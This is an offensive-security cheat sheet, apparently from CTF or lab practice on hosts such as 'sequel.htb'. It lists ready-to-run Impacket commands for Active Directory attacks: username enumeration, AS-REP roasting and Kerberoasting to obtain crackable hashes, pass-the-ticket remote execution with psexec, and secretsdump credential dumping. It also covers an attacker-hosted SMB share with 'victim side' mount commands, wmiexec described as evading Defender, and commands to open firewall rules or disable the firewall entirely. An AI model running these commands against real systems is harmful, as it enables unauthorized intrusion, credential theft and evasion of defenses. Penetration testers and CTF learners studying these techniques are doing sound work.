## Impacket username enumeration
condition: SMB IPC$ share readable
```
impacket-lookupsid  guest@ip_address
```

## Impacket ASREPRoast
```
impacket-GetNPUsers  -usersfile user.txt -no-pass -dc-ip 10.10.101.184  'vulnnet-rst.local/' -format {hashcat,john}
```

## Impacket Kerberoasting
```
impacket-GetUserSPNs 'Domain/username:password' -outputfile kerberoast.hash -dc-ip $IP
```

## smb server
```shell
impacket-smbserver share . -smb2support

# there may be group policies that block accessing to smb share without credentials
impacket-smbserver -username uuu -password ppp share . -smb2support

# victim side with powershell
$password = ConvertTo-SecureString -force -AsPlainText "ppp"
$cred = New-Object System.Management.Automation.PSCredential('uuu',$password)
New-PSDrive -name y -root \\<ipaddress>\share -credential $cred -psprovider "filesystem"

# victim side with cmd
net use y:  \\<ipaddress>\share /user:uuu ppp
```

## pass the ticket
```
export KRB5CCNAME=ticket.ccache
impacket-psexec administrator@dc.sequel.htb -k -no-pass     (must specify FQDN)
impacket-secretsdump dc.sequel.htb -k  (must specify FQDN)
```
error:
1. ~~impacket-psexec administrator@sequel.htb -k -no-pass~~:[-] SMB SessionError: STATUS_MORE_PROCESSING_REQUIRED({Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.)
2. ~~impacket-psexec administrator@10.10.11.202 -k~~:[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)

## impacket-wmiexec
* It won't trigger Defender unlinkn psexec and smbexec
* To establish a firewall exception for the WMI service, use the following command. (port 49667 required)
```powershell
netsh advfirewall firewall add rule dir=in name="WMI" program=%systemroot%\system32\svchost.exe service=winmgmt action=allow protocol=TCP localport=any
```
```powershell
Set-NetFirewallProfile -Enabled False # turn the entire firewall off
```
